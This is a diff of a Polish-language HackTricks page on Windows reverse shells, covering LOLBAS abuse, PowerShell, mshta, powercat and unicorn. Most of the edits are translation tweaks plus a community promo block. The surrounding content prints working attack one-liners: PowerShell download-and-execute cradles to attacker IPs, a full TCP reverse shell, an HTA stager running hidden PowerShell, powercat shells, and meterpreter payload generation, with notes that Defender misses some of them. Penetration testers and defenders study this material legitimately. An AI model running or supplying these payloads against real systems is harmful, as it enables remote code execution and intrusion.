@@ -10,14 +10,22 @@ Inne sposoby wsparcia HackTricks:
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.
 
 </details>
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 ## Lolbas
 
-Strona [lolbas-project.github.io](https://lolbas-project.github.io/) jest dla systemu Windows, podobnie jak [https://gtfobins.github.io/](https://gtfobins.github.io/) jest dla systemu Linux.\
-Oczywiście, **nie ma plików SUID ani uprawnień sudo w systemie Windows**, ale warto wiedzieć, **jak** niektóre **binaria** mogą być (wy)używane do wykonania nieoczekiwanych działań, takich jak **wykonywanie dowolnego kodu.**
+Strona [lolbas-project.github.io](https://lolbas-project.github.io/) jest odpowiednikiem dla systemu Windows tak jak [https://gtfobins.github.io/](https://gtfobins.github.io/) jest dla systemu Linux.\
+Oczywiście, **nie ma plików SUID ani uprawnień sudo w systemie Windows**, ale warto wiedzieć, **jak** niektóre **binaria** mogą być (nad)używane do wykonania nieoczekiwanych działań, takich jak **wykonywanie dowolnego kodu.**
 
 ## NC
 ```bash
@@ -79,15 +87,13 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-Proces wykonujący połączenie sieciowe: **powershell.exe**\
-Ładunek zapisany na dysku: **NIE** (_przynajmniej nigdzie, gdzie szukałem za pomocą procmon !_)
+Proces wykonujący wywołanie sieciowe: **powershell.exe**\
+Ładunek zapisany na dysku: **NIE** (_przynajmniej nigdzie, gdzie mogłem znaleźć, korzystając z procmon !_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 Proces wykonujący wywołanie sieciowe: **svchost.exe**\
-Ładunek zapisany na dysku: **Lokalna pamięć podręczna klienta WebDAV**
-
-**Jednolinijkowiec:**
+Payload zapisany na dysku: **Lokalna pamięć podręczna klienta WebDAV**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -111,11 +117,11 @@ mshta \\webdavserver\folder\payload.hta
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Możesz bardzo łatwo pobrać i uruchomić zombiaka Koadic, używając stagera hta**
+**Możesz bardzo łatwo pobrać i uruchomić zombi Koadic, używając stagera hta**
 
 #### Przykład hta
 
-[**Stąd**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+[**Tutaj**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 ```xml
 <html>
 <head>
@@ -291,7 +297,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Wykryty przez obrońcę**
+**Wykryte przez obrońcę**
 
 ## **MSIExec**
 
@@ -396,11 +402,11 @@ Pobierz, uruchom serwer sieciowy, uruchom nasłuchiwanie i wykonaj to na końcu 
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender nie wykrywa tego jako złośliwego kodu (jeszcze, 3/04/2019).
+Obrońca nie wykrywa tego jako złośliwego kodu (jeszcze, 3/04/2019).
 
 **Inne opcje oferowane przez powercat:**
 
-Powiązane powłoki, Odwrócona powłoka (TCP, UDP, DNS), Przekierowanie portu, Przesyłanie/pobieranie, Generowanie ładunków, Obsługa plików...
+Powiąż powłoki, Odwróć powłokę (TCP, UDP, DNS), Przekierowanie portu, Przesyłanie/pobieranie, Generowanie ładunków, Serwowanie plików...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -431,7 +437,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Utwórz wersję powershell tylnej furtki metasploit przy użyciu unicorn
+Utwórz wersję powershellowego backdoora metasploita, korzystając z narzędzia unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -439,7 +445,7 @@ Uruchom msfconsole z utworzonym zasobem:
 ```
 msfconsole -r unicorn.rc
 ```
-Uruchom serwer WWW serwujący plik _powershell\_attack.txt_ i wykonaj na ofierze:
+Rozpocznij serwer sieciowy obsługujący plik _powershell\_attack.txt_ i wykonaj na ofierze:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -461,6 +467,12 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Konsola PS z kilkoma ofensywny
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
 <summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
